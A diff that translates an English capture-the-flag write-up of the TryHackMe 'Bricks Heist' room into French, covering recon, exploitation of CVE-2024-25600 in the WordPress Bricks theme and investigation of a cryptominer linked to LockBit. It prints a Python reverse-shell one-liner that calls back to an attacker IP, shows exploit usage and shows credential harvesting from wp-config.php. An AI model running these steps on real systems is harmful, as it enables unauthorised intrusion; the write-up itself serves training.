@@ -1,18 +1,38 @@
-## Room setup
+# TryHack3M: Bricks Heist Write up 🇫🇷
 
-First we can add the IP target to the `/etc/hosts`  file so it’s easier to interact with the target machine.
+## Introduction
+
+Ce write-up couvre l’exploitation complète de la room **TryHack3M: Bricks** sur TryHackMe, classée de niveau **facile**.
+
+Voici les étapes qui seront détaillées dans ce write-up :
+
+- Phase de reconnaissance
+- Phase d’exploitation
+- Post-exploitation
+
+**Type de machine** : Linux
+**Compétences mises en œuvre** : Exploitation Web, WordPress, Énumération locale, Investigation Blockchain
+**Outils utilisés** : Nmap, Ffuf, Curl, Netcat, Searchsploit, WP-scan, Wappalyzer, Pwncat, Python, Git
+
+Cette room est idéale pour s’entraîner à : **l’énumération d’un serveur web (interne/externe)**, **l’exploitation d’un serveur web sous WordPress** et un peu à **l’investigation Blockchain**.
+
+C’est parti !
+
+## Préparation de la room
+
+Pour commencer, on peut ajouter l’IP de la machine cible au fichier `/etc/hosts` pour faciliter nos futures interactions avec la machine.
 
 ```bash
 10.10.254.241 target bricks.thm
 ```
 
-This allows us to access the IP address `10.10.254.241` via the following names : target and bricks.thm
+Cela nous permet alors de pouvoir accéder à l’adresse IP `10.10.254.241` en utilisant les noms suivants : `target` et `bricks.thm`.
 
-## Initial Recon & Observations
+## Reconnaissance initiale et observations
 
-First let’s make a quick agressive scan, in order to have a better view of the target machine.
+Dans un premier temps, effectuons un scan agressif sur la cible, afin d’avoir une meilleure compréhension de la machine cible.
 
-We can do that with the following Nmap command.
+On peut faire cela avec la commande Nmap suivante.
 
 ```bash
 nmap -A target -oX initial_scan.xml -oN initial_scan.txt
@@ -59,11 +79,13 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 18.83 seconds
 ```
 
-**Command explanation** : We start a Nmap scan using the agressive template (`-A`) then, we specify to save the result in two files named respectively `scan_initial.xml` and `scan_initial.txt`→ a XML file using the `-oX`  flag and a text file with the `-oN` one. We do that so we don’t have to scan the machine again and again.
+**Explication de la commande** : On lance un scan Nmap agressif (`-A`) ensuite, on enregistre les résultats dans deux fichiers, respectivement `scan_initial.xml` et `scan_initial.txt` → Un fichier XML avec le flag `-oX` et le fichier texte avec le flag `-oN`. Cela nous permet de scanner une fois pour toute la machine cible.
 
-The scan shows us very interesting stuff let’s view it in a table.
+**Note : Le fichier XML peut servir pour importer notre scan dans Metasploit. Mais, nous ne l’utiliserons pas durant ce challenge.**
 
-Using my tool Nmap2table ([Available here](https://github.com/0xMR007/Nmap2Table)) we get the following markdown table :
+Le scan nous montre des informations intéressantes.
+
+En utilisant mon outil Nmap2table ([Dispo ici](https://github.com/0xMR007/Nmap2Table)) j’obtiens le tableau suivant :
 
 ### Host : 10.10.47.101 (target)
 
@@ -125,31 +147,34 @@ HOP RTT        ADDRESS
 
 ```
 
-Let’s summarize what we know for now about the target machine :
+Faisons un point sur ce que nous savons de la machine jusqu’à présent :
 
-- Port 22 : SSH port is open + OpenSSH (8.2 ?) is running on the target + thanks to the version scan the target is probably running on Ubuntu
+- Port 22 : Port SSH ouvert + OpenSSH (8.2 ?) utilisé sur la machine cible + grâce au scan de version la machine cible est probablement une machine Linux sous Ubuntu.
 
-- Port 80 : The target machine appears to be hosting a website + it seems to be a Python webserver running versions between 3.5 - 3.10. This is confirmed by the `http-server-header` script which give us `WebSockify Python/3.8.10` .
+- Port 80 : La machine cible semble héberger un site web + un serveur web sous Python semble aussi être utilisé dont la version se situerait entre la 3.5 et la 3.10. Cette hypothèse est confirmée par le script `http-server-header` qui nous donne comme résultat `WebSockify Python/3.8.10`.
 
-- Port 443 : HTTPS is enabled, the target machine is running an Apache server probably with Wordpress on it. Indeed, this is confirmed by the script `http-generator` → We got a Wordpress version 6.5 (we should confirmed that during the web enum). We found a robots.txt with a disallowed entry (apparently `/wp-admin/`).
+- Port 443 : HTTPS est activé, la machine cible semble utiliser un serveur web Apache probablement avec WordPress. En effet, le script `http-generator` semble confirmer cela
+    - → Présence d’un WordPress version 6.5 (à confirmer plus tard).
+    - On remarque aussi la présence du fameux fichier
+    robots.txt avec une entrée non autorisée sur `/wp-admin/`.
 
-→ Having two different web-services running on the target machine surprised me however, this is a frequent configuration for  : services separations, test/development, remote console, honeypot, etc.
+→ Un serveur web utilisant deux services web différents sur les deux ports web m’a un peu surpris au premier abord mais, en faisant quelques recherches c’est en fait une configuration assez fréquente notamment pour : une séparation des services, un environnement test/dev, console distante, honeypot, etc.
 
-- Port 3306 : For now the only info we have on this port is that Mysql is running on the target certainly for the website (backend).
+- Port 3306 : Pour le moment, la seule information que nous avons sur ce port est que MySQL est utilisé sur la machine cible, sûrement pour la base de données du/des sites web (backend).
 
-## Web Enumeration
+## Énumération web
 
 ### Port 80
 
-With all the informations we got from here, we should enumerate the web ports of the target machine as it serves both HTTP & HTTPS.
+Avec toutes les informations que nous avons pu récupérer jusqu’à présent, nous devrions énumérer les deux ports web de la machine cible étant donné qu’HTTP et HTTPS sont activés.
 
-Let’s try to view the content on port 80 first using a browser
+Essayons de visiter la page web sur le port 80 (HTTP)
 
 <img src="./screenshots/1.png" width="80%">
 
-Using a browser we got a 405 HTTP error code → The method used (GET) is not allowed.
+En utilisant un navigateur on obtient une erreur HTTP 405 → La méthode utilisée (GET) n’est pas autorisée.
 
-Hmm…well we can try to get the methods which are allowed using curl right ? Let’s try this.
+Hmm… essayons d’obtenir les méthodes HTTP autorisées avec curl
 
 ```bash
 curl -v -X OPTIONS http://bricks.thm/             
@@ -189,36 +214,36 @@ curl -v -X OPTIONS http://bricks.thm/
 * shutting down connection #0
 ```
 
-Here we use the OPTIONS HTTP method which would let us know what HTTP methods are allowed. 
+Ici on utilise la méthode HTTP OPTIONS qui nous permettrait normalement de savoir quelles méthodes sont autorisées.
 
-In this cas the OPTIONS isn’t supported !
+Dans ce cas, OPTIONS **n’est pas supportée** !
 
-We need to search somewere else.
+Il va falloir chercher ailleurs.
 
-Lets try banner grabing on this port using Netcat
+Essayons un banner grabbing sur ce port avec Netcat...
 
 ```bash
 nc -v target 80
 target [10.10.218.10] 80 (http) open
 ```
 
-Well we already know that the port is open + the connection is droped after 3s so this didn’t help us much.
+Bon, on sait déjà que le port est ouvert + la connexion est perdue après 3 secondes, donc ça ne nous aide pas beaucoup.
 
-I think we should focus on the Wordpress website, let’s try !
+Je pense qu’on devrait se concentrer sur le site WordPress. Allons-y !
 
 ### Port 443
 
-Let’s start like before by viewing the content of the website using a browser.
+Commençons comme avant en affichant le contenu du site via un navigateur.
 
 <img src="./screenshots/2.png" width="80%">
 
-Nice ! We finally got something → A simple webpage with the text “**Brick by Brick!”** + an image of…bricks.
+Parfait ! On a enfin quelque chose → une simple page web avec le texte "**Brick by Brick!**" + une image de… briques.
 
-I quickly checked the source code, but it doesn’t give us anything interesting (at least this is what I thought more on that later).
+J’ai rapidement vérifié le code source, mais il ne semble rien contenir d’intéressant (en tout cas, c’est ce que je pensais… plus d’infos à ce sujet plus tard).
 
-So the first question is : *What is the content of the hidden .txt file in the web folder ?*
+Donc, la première question est : ***What is the content of the hidden .txt file in the web folder ?** soit **Quel est le contenu du fichier `.txt` caché dans le dossier web ?***
 
-The first thing I thought about was fuzzing so let’s fuzz using ffuf
+La première chose qui m’est venue à l’esprit, c’est du **fuzzing**, alors lançons un `ffuf` :
 
 ```bash
 ffuf -u https://bricks.thm/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200 -e .txt
@@ -250,21 +275,21 @@ robots.txt              [Status: 200, Size: 67, Words: 4, Lines: 4, Duration: 94
 :: Progress: [9492/9492] :: Job [1/1] :: 51 req/sec :: Duration: [0:03:36] :: Errors: 0 ::
 ```
 
-Unfortunately, the flag isn’t in these files (I dont know why there is 2 robots.txt).
+Malheureusement, **le flag n’est pas dans ces fichiers** (je ne sais pas pourquoi il y a deux `robots.txt`).
 
-We only got the `/wp-admin/` entry be we already knew about it.
+On a seulement repéré l’entrée `/wp-admin/` mais on le savait déjà.
 
-There is also an entry for `/wp-admin/admin-ajax.php` but I don’t think it is relevant.
+Il y a aussi une entrée pour `/wp-admin/admin-ajax.php` mais je ne pense pas que ce soit pertinent.
 
-So let’s continue our web enumeration by enumerating Wordpress.
+Donc continuons notre énumération web, cette fois sur **WordPress**.
 
-Yet, Wappalyzer gives us some very interesting informations :
+**Wappalyzer** nous donne quelques infos très intéressantes :
 
-- Wordpress 6.5 → Version seems to be confirmed
-- Python + PHP have been identified
-- Wordpress theme : Bricks (like the name of the room ? interesting…) → Potential exploit ?
+- WordPress 6.5 → la version semble confirmée
+- Python + PHP détectés
+- Thème WordPress : **Bricks** (comme le nom de la room ? intéressant…) → vulnérabilité potentielle ?
 
-Let’s enumerate Wordpress with WP-scan to see what else can we get.
+On va donc lancer **WPScan** pour voir ce qu’on peut récupérer de plus.
 
 ```bash
 wpscan --url https://bricks.thm/
@@ -285,11 +310,11 @@ _______________________________________________________________
 Scan Aborted: The url supplied 'https://bricks.thm/' seems to be down (SSL peer certificate or SSH remote key was not OK)
 ```
 
-It seems we have a SSL error (probably due to HTTPS).
+On a une erreur SSL (probablement à cause de HTTPS).
 
-A quick search on this error tells us to use the `--disable-tls-checks` option which fixes the error.
+Une recherche rapide sur cette erreur indique qu’il faut ajouter l’option `--disable-tls-checks` pour corriger ça.
 
-So let’s try again.
+On relance donc avec cette option :
 
 ```bash
 wpscan --url https://bricks.thm/ --disable-tls-checks
@@ -388,13 +413,12 @@ Interesting Finding(s):
 [+] Elapsed time: 00:00:08
 ```
 
-This scan gives us several informations, but there is one that really catch my attention :
+Le scan nous donne pas mal d’informations, mais **une chose retient mon attention** :
+**Le thème WordPress (encore !) : Bricks → et cette fois, on a sa version exacte.**
 
-The Wordpress theme (again !!) : Bricks → And now we got it’s version !
+Si ce thème est vulnérable, on pourra peut-être l’exploiter.
 
-If this theme has vulns we could exploit it !
-
-Let’s do this using searchsploit
+On tente une recherche avec **searchsploit** :
 
 ```bash
 searchsploit Bricks 1.9.5
@@ -413,27 +437,22 @@ Shellcodes: No Results
 Papers: No Results
 ```
 
-Well searchsploit didn’t help us much so let’s make a quick google search.
+Bon, searchsploit ne nous a pas vraiment aidés. Faisons une recherche Google pour en savoir plus sur ce thème WordPress. Après avoir fait une simple recherche Google “wordpress bricks vulns” on obtient la CVE suivante : **CVE-2024-25600**
 
-After making a simple google search “wordpress bricks vulns” we got the following CVE :
+Gravité : **élevée**, avec un score **CVSS de 10/10**
 
-**CVE-2024-25600**
+Cette vulnérabilité repose sur une mauvaise gestion des entrées utilisateurs dans le plugin **Bricks Builder**, menant à une **RCE par injection de code**.
 
-Its servery is set to High with a CVSS score of 10 !
+Plus d’infos ici :
 
-This vuln exploits a flaw in the Bricks Builder plugin’s handling of user input which could lead to a RCE using a code injection exploit.
+- NVD : https://nvd.nist.gov/vuln/detail/CVE-2024-25600
+- GitHub (exploit de Chocapikk) : https://github.com/Chocapikk/CVE-2024-25600
 
-You will found the CVE down below + a link to the github repo to exploit it.
+Vous pouvez aussi coder votre propre script Python, mais ici je vais utiliser celui de **Chocapikk**.
 
-NVD link : https://nvd.nist.gov/vuln/detail/CVE-2024-25600
+## Exploitation de WordPress
 
-Github Repo : https://github.com/Chocapikk/CVE-2024-25600 (168 stars)
-
-You can also make your own Python script but here I will use Chocapikk’s.
-
-## Wordpress exploitation
-
-Let’s start by cloning the exploit repo
+On commence par cloner le dépôt contenant l’exploit :
 
 ```bash
 git clone https://github.com/Chocapikk/CVE-2024-25600.git
@@ -444,94 +463,96 @@ remote: Compressing objects: 100% (38/38), done.
 remote: Total 51 (delta 18), reused 45 (delta 12), pack-reused 0 (from 0)
 Réception d'objets: 100% (51/51), 20.83 Kio | 2.60 Mio/s, fait.
 Résolution des deltas: 100% (18/18), fait.
+
 ```
 
-In order to make a proper install it is highly recommended to create Python virtual environement to install the dependencies of the Python script.
+Afin de faire une installation correcte, il est fortement recommandé de créer un environnement virtuel Python pour installer les dépendances du script Python.
 
-To do that we can use the following command
+Pour ce faire, nous pouvons utiliser la commande suivante :
 
 ```bash
-python3 -m venv CVE-2024-25600-env # <- You can name it whatever you want
-source CVE-2024-25600-env/bin/activate # We then activate the virtual environement
-pip install -r requirements.txt # Only then we install the dependencies
+python3 -m venv CVE-2024-25600-env # <- Vous pouvez le nommer comme vous voulez
+source CVE-2024-25600-env/bin/activate # Nous activons ensuite l'environnement virtuel
+pip install -r requirements.txt # Nous installons ensuite les dépendances
 
-# You can deactivate the venv using the following command
+# Vous pouvez désactiver le venv en utilisant la commande suivante
 deactivate
 ```
 
-Nice now let’s try to run the script !
+Bien, essayons maintenant de lancer le script !
 
 ```bash
-chmod +x exploit.py # Give execution perm
-python exploit.py -u https://bricks.thm/    
-                                        
-[*] Nonce found: 5f3fce1e00 # You can also get this value on the website source code
-[+] https://bricks.thm/ is vulnerable to CVE-2024-25600. Command output: apache
-[!] Shell is ready, please type your commands UwU
+chmod +x exploit.py # Donner les permissions d'exécution
+python exploit.py -u https://bricks.thm/
+
+[*] Nonce trouvé : 5f3fce1e00 # Vous pouvez également obtenir cette valeur dans le code source du site web
+[+] https://bricks.thm/ est vulnérable à CVE-2024-25600. Sortie de la commande : apache
+[!] Le shell est prêt, veuillez taper vos commandes UwU
 # id
 uid=1001(apache) gid=1001(apache) groups=1001(apache)
+
 ```
 
-Well that was fast ! We finally got a shell session awesome !
+C'était rapide ! Nous avons enfin une session shell, génial !
 
-We can now retrieve the first flag under /data/www/default
+Nous pouvons maintenant récupérer le premier flag sous /data/www/default
 
 ```bash
 # pwd
 /data/www/default
-
 # cat 650c844110baced87e1606453b93f22a.txt
 THM{fl46_650c844110baced87e1606453b93f22a}
+
 ```
 
-## Q1 answer
+## Réponse à la Q1
 
-The answer is **THM{fl46_650c844110baced87e1606453b93f22a}**
+La réponse est **THM{fl46_650c844110baced87e1606453b93f22a}**
 
-Now that we’ve got a shell on the target we might want to stabilize it as we can’t do much with it.
+Maintenant que nous avons un shell sur la cible, nous pourrions vouloir le stabiliser car nous ne pouvons pas faire grand-chose avec.
 
-In order to do that I like using `pwncat` (https://github.com/calebstewart/pwncat) which is a really useful tool. Go check it out !
+Pour ce faire, j'aime utiliser `pwncat` (https://github.com/calebstewart/pwncat) qui est un outil vraiment utile. Jetez-y un oeil !
 
-We can get a stable reverse shell using the following commands.
+Nous pouvons obtenir un reverse shell stable en utilisant les commandes suivantes.
 
-First start the pwncat listener
+D'abord, on démarre l’écoute pwncat
 
 ```bash
 pwncat -lp 4444
-[11:35:05] Welcome to pwncat 🐈!                                                                        __main__.py:164
-bound to 0.0.0.0:4444
+[11:35:05] Bienvenue à pwncat 🐈! __main__.py:164
+lié à 0.0.0.0:4444
 ```
 
-Then we can create a reverse shell in Python
+Ensuite, nous pouvons créer un reverse shell en Python
 
 ```bash
-# which python # We first check that Python is available on the target machine
+# which python # Nous vérifions d'abord que Python est disponible sur la machine cible
 /usr/bin/python
+# Ensuite, nous exécutons le reverse shell Python
+# python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("<THM_LOCAL_IP",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
 
-# Next we execute the Python reverse shell
-# python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("<THM_LOCAL_IP",4444));[os.dup2(s.fileno(),f)for f in(0,1
-,2)];pty.spawn("sh")'
 ```
 
 ```bash
 pwncat -lp 4444
-[11:35:05] Welcome to pwncat 🐈!                                                                        __main__.py:164
-[11:37:48] received connection from 10.10.35.124:53306                                                       bind.py:84
-[11:37:49] 0.0.0.0:4444: upgrading from /usr/bin/dash to /usr/bin/bash                                   manager.py:957
-[11:37:50] 10.10.35.124:53306: registered new host w/ db                                                 manager.py:957
-(local) pwncat$
-# Using CTRL + D we get a clean reverse shell                                                                                                       
-(remote) apache@tryhackme:/data/www/default$ id
+[11:35:05] Bienvenue à pwncat 🐈! __main__.py:164
+[11:37:48] connexion reçue de 10.10.35.124:53306 bind.py:84
+[11:37:49] 0.0.0.0:4444: mise à niveau de /usr/bin/dash à /usr/bin/bash manager.py:957
+[11:37:50] 10.10.35.124:53306: nouvel hôte enregistré avec la base de données manager.py:957
+(local) pwncat\$
+# En utilisant CTRL + D, nous obtenons un reverse shell propre
+(remote) apache@tryhackme:/data/www/default\$ id
 uid=1001(apache) gid=1001(apache) groups=1001(apache)
+
 ```
 
-**Note : I tried many reverse shell payloads (Bash, Netcat, Perl, etc) but I kept getting this error : `[-] No valid response received or target not vulnerable` . Only the Python one worked for me.**
+**Note : J'ai essayé de nombreux payloads de reverse shell (Bash, Netcat, Perl, etc.) mais je continuais à obtenir cette erreur : `[-] No valid response received or target not vulnerable`. Seul celui en Python a fonctionné pour moi.**
 
-## Post exploitation
+## Post-exploitation
 
-Ok now that we’ve gained access to the target machine we need to find a “suspicious process”.
+OK, maintenant que nous avons accès à la machine cible, nous devons trouver un "processus suspect".
 
-I tried using the `ps -aux` command but didn’t find anything.
+J'ai essayé d'utiliser la commande `ps -aux` mais je n'ai rien trouvé.
 
 ```bash
 ps -aux
@@ -549,11 +570,11 @@ root          12  0.0  0.0      0     0 ?        S    08:58   0:00 [rcu_tasks_tr
 [..................................................................................]
 ```
 
-Let’s look around the system to see if there are interesting informations (creds, ssh keys, SUID files, etc).
+Regardons autour du système pour voir s'il y a des informations intéressantes (identifiants, clés ssh, fichiers SUID, etc.). → Rien non plus à première vue.
 
-### Local Enum
+### Énumération locale
 
-First we can take a look at the Wordpress config file which is `wp-config.php` 
+Tout d'abord, nous pouvons jeter un coup d'œil au fichier de configuration WordPress qui est `wp-config.php`
 
 ```bash
 (remote) apache@tryhackme:/data/www/default$ cat wp-config.php
@@ -653,11 +674,11 @@ if ( ! defined( 'ABSPATH' ) ) {
 require_once ABSPATH . 'wp-settings.php';
 ```
 
-Nice we now have some creds ! root:lamp.sh
+Bien, nous avons maintenant des identifiants ! root.sh
 
-Remember we need to found a suspicious process and next the service affiliated with it.
+N'oubliez pas que nous devons trouver un processus suspect et ensuite le service qui lui est affilié.
 
-Let’s list all the services on the system using the following command
+Listons tous les services sur le système en utilisant la commande suivante
 
 ```bash
 (remote) apache@tryhackme:/data/www/default$ systemctl list-units --type=service --state=running
@@ -699,75 +720,72 @@ Let’s list all the services on the system using the following command
   unattended-upgrades.service                    loaded active running Unattended Upgrades Shutdown
 ```
 
-There’s a lot of services that are running but one stand out (the description contains TRYHACK3M which is relevant to the challenge) :
+Il y a beaucoup de services qui sont en cours d'exécution mais un se distingue (la description contient TRYHACK3M qui est pertinent pour le challenge) :
 
 ```bash
-ubuntu.service                                 loaded active running TRYHACK3M          >
+ubuntu.service loaded active running TRYHACK3M
 ```
 
-This service is the answer to the Q3.
+Ce service est la réponse à la Q3.
 
-Let’s view the content of this service file.
+Voyons le contenu de ce fichier de service.
 
 ```bash
-(remote) apache@tryhackme:/data/www/default$ systemctl cat ubuntu.service
+(remote) apache@tryhackme:/data/www/default\$ systemctl cat ubuntu.service
 # /etc/systemd/system/ubuntu.service
 [Unit]
 Description=TRYHACK3M
-
 [Service]
 Type=simple
 ExecStart=/lib/NetworkManager/nm-inet-dialog
 Restart=on-failure
-
 [Install]
 WantedBy=multi-user.target
 ```
 
-Nice, now we also have the answer to the Q2 !
+Bien, maintenant nous avons aussi la réponse à la Q2 !
 
-## Q2 & Q3 answers
+## Réponses aux Q2 et Q3
 
-So far we got :
+Jusqu'à présent, nous avons obtenu :
 
-- Q2 answer which is `nm-inet-dialog`
-- Q3 answer which is `ubuntu.service`
+- Réponse à la Q2 qui est `nm-inet-dialog`
+- Réponse à la Q3 qui est `ubuntu.service`
 
 ## Q4  : What is the log file name of the miner instance ?
 
-Ok now we’ve got the exact location of `nm-inet-dialog` which is under `/lib/NetworkManager` .
-
-Le’ts go there and see what we can find.
+OK, maintenant nous avons l'emplacement exact de `nm-inet-dialog` qui se trouve sous `/lib/NetworkManager`. Déplaçons nous sous ce répertoire et voyons ce que nous pouvons trouver.
 
 ```bash
 (remote) apache@tryhackme: cd /lib/NetworkManager
-(remote) apache@tryhackme:/lib/NetworkManager$ ls -la
+(remote) apache@tryhackme:/lib/NetworkManager\$ ls -la
 total 8636
-drwxr-xr-x   6 root root    4096 Apr  8  2024 .
-drwxr-xr-x 148 root root   12288 Apr  2  2024 ..
-drwxr-xr-x   2 root root    4096 Feb 27  2022 VPN
-drwxr-xr-x   2 root root    4096 Apr  3  2024 conf.d
-drwxr-xr-x   5 root root    4096 Feb 27  2022 dispatcher.d
--rw-r--r--   1 root root   48190 Apr 11  2024 inet.conf
--rwxr-xr-x   1 root root   14712 Feb 16  2024 nm-dhcp-helper
--rwxr-xr-x   1 root root   47672 Feb 16  2024 nm-dispatcher
--rwxr-xr-x   1 root root  843048 Feb 16  2024 nm-iface-helper
--rwxr-xr-x   1 root root 6948448 Apr  8  2024 nm-inet-dialog
--rwxr-xr-x   1 root root  658736 Feb 16  2024 nm-initrd-generator
--rwxr-xr-x   1 root root   27024 Mar 11  2020 nm-openvpn-auth-dialog
--rwxr-xr-x   1 root root   59784 Mar 11  2020 nm-openvpn-service
--rwxr-xr-x   1 root root   31032 Mar 11  2020 nm-openvpn-service-openvpn-helper
--rwxr-xr-x   1 root root   51416 Nov 27  2018 nm-pptp-auth-dialog
--rwxr-xr-x   1 root root   59544 Nov 27  2018 nm-pptp-service
-drwxr-xr-x   2 root root    4096 Nov 27  2021 system-connections
+drwxr-xr-x 6 root root 4096 Apr 8 2024 .
+drwxr-xr-x 148 root root 12288 Apr 2 2024 ..
+drwxr-xr-x 2 root root 4096 Feb 27 2022 VPN
+drwxr-xr-x 2 root root 4096 Apr 3 2024 conf.d
+drwxr-xr-x 5 root root 4096 Feb 27 2022 dispatcher.d
+-rw-r--r-- 1 root root 48190 Apr 11 2024 inet.conf
+-rwxr-xr-x 1 root root 14712 Feb 16 2024 nm-dhcp-helper
+-rwxr-xr-x 1 root root 47672 Feb 16 2024 nm-dispatcher
+-rwxr-xr-x 1 root root 843048 Feb 16 2024 nm-iface-helper
+-rwxr-xr-x 1 root root 6948448 Apr 8 2024 nm-inet-dialog
+-rwxr-xr-x 1 root root 658736 Feb 16 2024 nm-initrd-generator
+-rwxr-xr-x 1 root root 27024 Mar 11 2020 nm-openvpn-auth-dialog
+-rwxr-xr-x 1 root root 59784 Mar 11 2020 nm-openvpn-service
+-rwxr-xr-x 1 root root 31032 Mar 11 2020 nm-openvpn-service-openvpn-helper
+-rwxr-xr-x 1 root root 51416 Nov 27 2018 nm-pptp-auth-dialog
+-rwxr-xr-x 1 root root 59544 Nov 27 2018 nm-pptp-service
+drwxr-xr-x 2 root root 4096 Nov 27 2021 system-connections
+
 ```
 
-Ok so we have a lot of stuff here. After looking around, the first file that could be a log file to me was the `inet.conf` one.
+OK, on a pas mal de choses ici. Après avoir regardé autour, le premier fichier qui pourrait être un fichier log pour moi était le `inet.conf`.
 
-So I checked it’s content.
+J'ai alors vérifié son contenu.
 
 ```bash
-(remote) apache@tryhackme:/lib/NetworkManager$ head -n 25 inet.conf
+(remote) apache@tryhackme:/lib/NetworkManager\$ head -n 25 inet.conf
 ID: 5757314e65474e5962484a4f656d787457544e424e574648555446684d3070735930684b616c70555a7a566b52335276546b686b65575248647a525a57466f77546b64334d6b347a526d685a6255313459316873636b35366247315a4d304531595564476130355864486c6157454a3557544a564e453959556e4a685246497a5932355363303948526a4a6b52464a7a546d706b65466c525054303d
 2024-04-08 10:46:04,743 [*] confbak: Ready!
 2024-04-08 10:46:04,743 [*] Status: Mining!
@@ -793,97 +811,98 @@ ID: 5757314e65474e5962484a4f656d787457544e424e574648555446684d3070735930684b616c
 2024-04-08 10:48:14,656 [*] Miner()
 2024-04-08 10:48:16,656 [*] Miner()
 2024-04-08 10:48:18,659 [*] Miner()
+
 ```
 
-By its content, we guess it’s this file that is used as a log file.
+Par son contenu, nous devinons que c'est ce fichier qui est utilisé comme fichier log.
 
-I tried to enter its name and yes ! This is the file.
+J'ai essayé d'entrer son nom et oui ! C'est ce fichier.
 
-## Q4 answer
+## Réponse à la Q4
 
-The answer is `inet.conf` .
+La réponse est `inet.conf`.
 
 ## Q5 : What is the wallet address of the miner instance ?
 
-Here we need to find a Bitcoin wallet address. You may have noticed the long string inside the previous file. But I didn't pay attention to it.
+Ici, nous devons trouver une adresse Bitcoin. Vous avez peut-être remarqué la longue chaîne à l'intérieur du fichier précédent. Perso, je l’avais remarqué mais je ne savais pas quoi en faire.
 
-In fact it is an obfuscated string (I took note of that !).
+En fait, c'est une chaîne obfusquée (j’en ai pris note !).
 
-Simple definition of data obfuscation found on the Internet : Data obfuscation is a process used to hide sensitive information within data to prevent unauthorized access.
+**Définition simple de l'obfuscation de données trouvée sur Internet :** 
 
-So you got it we need to deobfuscate this string. Let’s try to do this using Cyberchef !
+L’obfuscation de données est une technique de sécurité qui consiste à **transformer des données sensibles ou critiques** (comme des mots de passe, des identifiants, ou du code source) afin de **les rendre difficilement compréhensibles** ou exploitables pour un humain ou un programme malveillant, **tout en conservant leur fonctionnalité ou structure de base**.
+
+Donc, vous l’avez compris, nous devons désobfusquer cette chaîne. Essayons de le faire en utilisant Cyberchef !
 
 <img src="./screenshots/3.png" width="80%">
 
-**Note : The Magic operation attempts to detect various properties of the input data and suggests which operations could help to make more sense of it. (Source : Cyberchef)**
+**Note : La fonction Magic de Cyberchef tente de détecter diverses propriétés des données d'entrée et suggère quelles opérations pourraient aider à en faire plus sens. (Source : Cyberchef)**
 
-Using the **Magic** function of Cyberchef we managed to get an interesting result.
+En utilisant la fonction **Magic** de Cyberchef, nous obtenons un résultat intéressant.
 
-Result : bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qabc1qyk79fcp9had5kreprce89tkh4wrtl8avt4l67qa
+Résultat : `bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qabc1qyk79fcp9had5kreprce89tkh4wrtl8avt4l67qa`
 
-If you take a close look at the result you will found that we managed to retrieve not only one Bitcoin address but 2 !
+Si vous regardez de près, vous trouverez que nous avons réussi à récupérer non pas une mais deux adresses Bitcoin !
 
-- First address : `bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa`
-- Second addres : `bc1qyk79fcp9had5kreprce89tkh4wrtl8avt4l67qa`
+- Première adresse : `bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa`
+- Deuxième adresse : `bc1qyk79fcp9had5kreprce89tkh4wrtl8avt4l67qa`
 
-Now how to know which one is the answer ? Well here we only have 2 addresses so you can just try both of them and see which one is it.
+Maintenant, comment savoir laquelle est la réponse ? Eh bien, ici, nous n'avons que deux adresses, donc vous pouvez simplement essayer les deux et voir laquelle est la bonne.
 
-Nevertheless, we can also check the validity of an address using a Bitcoin wallet lookup website.
+Néanmoins, nous pouvons également vérifier la validité d'une adresse en utilisant un site web de lookup d’adresses Bitcoin.
 
-For example, using https://www.blockonomics.co we get the following result
+Par exemple, en utilisant [https://www.blockonomics.co](https://www.blockonomics.co/), nous obtenons le résultat suivant
 
 <img src="./screenshots/4.png" width="80%">
 
-For the second one you’ll get  the following error message : 
+Pour la deuxième, vous obtiendrez le message d'erreur suivant :
+`Invalid BTC Address bc1qyk79fcp9had5kreprce89tkh4wrtl8avt4l67qa`
 
-`Invalid BTC Address bc1qyk79fcp9had5kreprce89tkh4wrtl8avt4l67qa` 
+## Réponse à la Q5
 
-## Q5 answer
-
-The answer is `bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa`
+La réponse est `bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa`
 
 ## Q6 : The wallet address used has been involved in transactions between wallets belonging to which threat group ?
 
-To anwser this question we’ll follow the next steps :
+Pour répondre à cette question, nous suivrons les étapes suivantes :
 
-- Retrieve past transactions using the previous website ([https://www.blockonomics.co](https://www.blockonomics.co/))
-- Check for suspicious amount
-- Check to which wallet address the transaction was destinated
-- Search about the destination address
+- Récupérer les transactions passées en utilisant le site web précédent ([https://www.blockonomics.co](https://www.blockonomics.co/))
+- Vérifier les montants suspects
+- Vérifier à quelle adresse Bitcoin la transaction était destinée
+- Rechercher l'adresse de destination
 
-On the previous screenshot, we can see a huge transaction has been made on the 12th May 2023.
+Sur la capture d'écran précédente, nous pouvons voir qu'une énorme transaction a été effectuée le 12 mai 2023.
 
-Checking the ouput addresses we get :
+En vérifiant les adresses de sortie, nous obtenons :
 
 - `bc1q4xh8cmyp5e4cus660ah2jv3ja8pg7fgml8lj3g`
 - `32pTjxTNi7snk8sodrgfmdKao3DEn1nVJM`
 
-Searching about the first one didn’t give me anything interesting, whereas the second one gave me the following articles :
+En recherchant la première, je n'ai rien trouvé d'intéressant, alors qu'avec la deuxième, j'ai obtenu les articles suivants :
 
-- First one is from the US departement of treasury :
+- Le premier provient du département de la trésorerie américaine:
     - https://ofac.treasury.gov/recent-actions/20240220
-- And the second one is a from the Chainanalysis website :
+- Et le deuxième provient du site web Chainanalysis :
     - https://www.chainalysis.com/blog/lockbit-takedown-sanctions-february-2024/
 
-Both mention the name of a ransomware group named **LockBit** !
+Les deux mentionnent le nom d'un groupe de ransomware nommé **LockBit** !
 
-## Q6 answer
+## Réponse à la Q6
 
-The answer is **Lockbit.**
-Perfect we finished the room ! Congrats !
+La réponse est **Lockbit**.
 
-## Summary
+Parfait, nous avons terminé la room ! Félicitations !
 
-This room was about exploiting a vulnerable Wordpress website via a Wordpress plugin/theme (Bricks). After gaining an RCE on the target machine we got creds, (useless to the challenge by the way), we also had to find a suspicious process (definetly a cryptominer malware) and investigate about it (logs, Bitcoin wallet address, searching about wallet addresses).
+## Résumé
 
